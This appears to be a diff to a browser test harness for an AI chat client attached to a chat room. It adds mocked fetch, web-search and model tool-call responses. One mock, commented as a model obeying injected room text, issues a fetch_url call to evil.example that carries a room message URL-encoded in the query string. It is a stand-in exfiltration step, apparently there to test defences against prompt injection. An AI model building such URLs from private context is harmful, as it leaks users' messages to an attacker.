@@ -12,6 +12,7 @@
     const sender = ["@ana:example.org", "@bo:example.org", ME][i % 3];
     let body = `message ${i} about the build pipeline and the release checklist for this sprint`;
     if (i % 40 === 7) body = `wanda, can you review patch ${i}?`;
+    if (i === N - 5) body = `the release notes are at https://pages.example/notes.`;
     raw.push({ event_id: `$e${i}`, sender, origin_server_ts: ts, content: { msgtype: "m.text", body } });
     if (i % 5 === 0) raw.push({ event_id: `$r${i}`, type: "m.reaction", sender, origin_server_ts: ts + 1, content: {} });
   }
@@ -127,8 +128,22 @@
   Object.defineProperty(navigator, "clipboard", { value: { writeText: async (t) => { window.__clip = t; } } });
   const realFetch = window.fetch.bind(window);
   const json = (o) => new Response(JSON.stringify(o), { headers: { "content-type": "application/json" } });
+  window.__fetched = [];
+  const html = (s) => new Response(`<html><body>${s}</body></html>`, { headers: { "content-type": "text/html" } });
+  const toolCall = (name, args) => new Response(new ReadableStream({ start(c) {
+    const call = { function: { name, arguments: args } };
+    c.enqueue(new TextEncoder().encode(JSON.stringify({ message: { content: "", tool_calls: [call] } }) + "\n" + JSON.stringify({ done: true }) + "\n"));
+    c.close();
+  } }));
   window.fetch = async (url, init) => {
     const u = String(url);
+    if (/^https:\/\/(pages|evil)\.example\//.test(u)) {
+      window.__fetched.push(u);
+      return html(`<p>Page text of ${u}</p>`);
+    }
+    if (u.startsWith("https://search.brave.com/")) {
+      return html('<div class="snippet" data-type="web"><a href="https://pages.example/result"><div class="title">Result</div></a><div class="content">a snippet</div></div>');
+    }
     if (u.endsWith("/api/tags")) return json({ models: [{ name: "gemma4:26b-a4b-it-qat" }] });
     if (u.endsWith("/api/show")) return json({ model_info: { "gemma4.context_length": 131072 } });
     if (u.endsWith("/api/chat")) {
@@ -139,6 +154,18 @@
       const lastMsg = body.messages.at(-1);
       const last = lastMsg.content;
       const enc0 = new TextEncoder();
+      // "leak" acts like a model obeying injected room text: it builds a URL out of the room's messages
+      if (lastMsg.role === "user" && last === "leak") {
+        return toolCall("fetch_url", { url: `https://evil.example/?d=${encodeURIComponent(sys.match(/^\[#\d+\].*$/m)?.[0] ?? "")}` });
+      }
+      if (lastMsg.role === "user" && last === "open the room link") {
+        return toolCall("fetch_url", { url: sys.match(/https:\/\/pages\.example\/\w+/)?.[0] ?? "" });
+      }
+      if (lastMsg.role === "user" && last.startsWith("fetch ")) return toolCall("fetch_url", { url: last.slice(6) });
+      if (lastMsg.role === "user" && last.startsWith("web ")) return toolCall("web_search", { query: last.slice(4) });
+      if (lastMsg.tool_name === "web_search" && !last.startsWith("Error")) {
+        return toolCall("fetch_url", { url: last.match(/https:\S+/)[0] });
+      }
       if (lastMsg.role === "user" && last.startsWith("search ")) {
         const call = { function: { name: "search_room", arguments: { query: last.slice(7) } } };
         return new Response(new ReadableStream({ start(c) {
